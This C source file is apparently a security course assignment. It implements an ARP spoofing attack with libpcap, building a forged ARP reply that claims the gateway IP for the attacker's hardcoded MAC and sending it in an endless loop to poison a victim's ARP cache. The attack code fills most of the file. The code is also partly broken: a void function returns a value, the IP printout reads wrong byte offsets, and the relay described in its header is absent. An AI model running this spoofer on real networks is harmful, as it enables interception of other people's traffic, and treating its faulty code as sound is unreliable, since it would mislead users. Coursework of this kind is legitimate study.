// GOALS
// 1. ARP relay
// 2. Recovery Detect & Auto poisoning


// PLAN
// pcap_A04_arp_sppof.c : Complete
// pcap_A04_arp_spoof_v1 : Frist Basic Arp spoofing
// pcap_A04_arp_sppof_v2 : Arp relay

/*
[리포트] 
arp spoofing 프로그램을 구현하라.
victim(sender)에서 ping 통신이 원활히 작동하면 과제 완료.
[프로그램] 
arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]
ex : arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2
[제출 기한] 
2017.08.08 05:59
[ps]
소스 코드는 가급적 C, C++(다른 programming language에 익숙하다면 그것으로 해도 무방).
bob@gilgil.net 계정으로 자신의 git repository 주소를 알려 줄 것.
개인 허니팟을 띄워 하거나 BoBMil이라는 AP(암호는 BoB AP와 동일)를 사용할 것.
필요에 따라 thread도 써야 하고, arp spoofing session을 list 관리도 해야 하고... 이번 과제부터 멘붕이 오기 시작할 것임. C++ 사용 추천.

*/

#include <stdio.h>
#include <pcap.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/ether.h>	     // for either_ntoa
#include <netinet/if_ether.h>    // for ehter sturcture
#include <netinet/ip.h>    		 // for ip structure
#include <netinet/tcp.h>  		 // for tcp structure
#include <arpa/inet.h>
#include <math.h>
#include <string.h>


int _pcap_func(char *dev_str);
void arp_spoof(u_char* dev_str, u_char *sender_ip, u_char *target_ip);



//======================================================================================
//====================================MAIN()============================================ 

int main(int argc, char *argv[]){


// TAKE ARGUMENT 1, 2, 3
	u_char dev_str[80];
	strcpy(dev_str,argv[1]);
	printf("Dev: %s\n",dev_str);

	u_char sender_ip_str[80] ;
	strcpy(sender_ip_str,argv[2]);

	u_char target_ip_str[80];
	strcpy(target_ip_str,argv[3]);

	const char s[2] = ".";
	
	char *token;

	u_char sender_ip[4];
	u_char target_ip[4];

	

// STRAT : IP ADDRESS
	int i=0;
	token = strtok(sender_ip_str, s);
	while( token != NULL ) 
	{
	  sender_ip[i]=atoi(token);
	  i++;
	  token = strtok(NULL, s);
	}

	i=0;
	token = strtok(target_ip_str, s);
	while( token != NULL ) 
	{
	  target_ip[i]=atoi(token);
	  i++;
	  token = strtok(NULL, s);
	}


// PRINT ARGUMENT 1, 2, 3
	printf("Sender IP : ");
	for(int j=0; j<4; j++){
		printf("%d",sender_ip[j]);
		if(j<3) printf(".");
	}
	printf("\n");

	printf("Target IP : ");
	for(int j=0; j<4; j++){
		printf("%d",target_ip[j]);
		if(j<3) printf(".");
	}
	printf("\n============================\n");


	setbuf(stdout,NULL);
	setbuf(stdin,NULL);

	printf("arp_spoof()\n");
	arp_spoof(dev_str,sender_ip,target_ip);

	printf("\n*END Packet sniff*\n");
	return 0;

}


//======================================================================================
//===============================arp_spoof()======================================


void arp_spoof(u_char *dev_str, u_char *sender_ip, u_char *target_ip){
	u_char arp_packet[43]={               
		/* 						ETHER PACKET    				       			 */
		0x00,0x0c,0x29,0xff,0x61,0x71,   /*Destination Mac : Target(VM_win10)    */ 
		0x00,0x0c,0x29,0xcd,0xda,0x7a,   /*Source Mac      : Attacker(VM_Ubuntu) */
		0x08, 0x06,				         /*Ether Type                			 */
		/*				  	   NOW ARP PACKET  									 */
		0x00, 0x01,						 /*Hardware Type 						 */
		0x08, 0x00,						 /*Protocol Type 						 */
		0x06,					         /*Hardware Size, Length      			 */ 
		0x04,					         /*Protocol Size			  			 */
		0x00,0x02,				         /*Opcode, 2 is replay        			 */
		0x00,0x0c,0x29,0xcd,0xda,0x7a,   /*Sender MAC      : Attacker(VM_Ubuntu) */
		0xc0,0xa8,0xf6,0x02,		     /*Sender IP (GW IP)		 			 */
		0x00,0x0c,0x29,0xff,0x61,0x71,   /*Target MAC      : Target(VM_win10)    */
		0xc0,0xa8,0xf6,0x87				 /*Tartget IP      : Target              */
	};

// REPLACE : sender ip, target ip
	for(int i=0; i<4; i++){
		arp_packet[28+i]=sender_ip[i];
	}	
	for(int i=0; i<4; i++){
		arp_packet[38+i]=target_ip[i];
	}	
// REPLACE OPCODE
	arp_packet[21]=0x02;

/*
	for(i=0;i<sizeof(arp_packet);i++){
		if(16%arp_packet[i]==0)
			printf("\n");
		printf("%x ",arp_packet[i]);
	}
*/
	pcap_t *s_handle;
	u_char *s_packet;
	struct pcap_pkthdr *header;
	char errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 mask;
	bpf_u_int32 net;




	if (dev_str == NULL) { fprintf(stderr, "Couldn't find default device: %s\n", errbuf); return(2); }
	s_handle = pcap_open_live(dev_str, BUFSIZ, 1, 1000, errbuf);
	if (s_handle == NULL) { fprintf(stderr, "Couldn't open device %s: %s\n", dev_str, errbuf); return(2); }
	
	
// WORK
	while(1){
		for(int i=0; i<sizeof(arp_packet); i++){
		pcap_sendpacket(s_handle, arp_packet, sizeof(arp_packet));

		if(i%16==0) printf("\n");
		printf("%02x ",arp_packet[i]);	
	}

	printf("\nin Sender IP: ");
	for(int i=0; i<4; i++){
		printf("%d",arp_packet[29+i]);
		if(i<3)printf(".");
	}
	printf("\n");
	printf("in Target IP: ");
	for(int i=0;i<4; i++){
		printf("%d", arp_packet[37+i]);
		if(i<3)printf(".");
	}

 }

}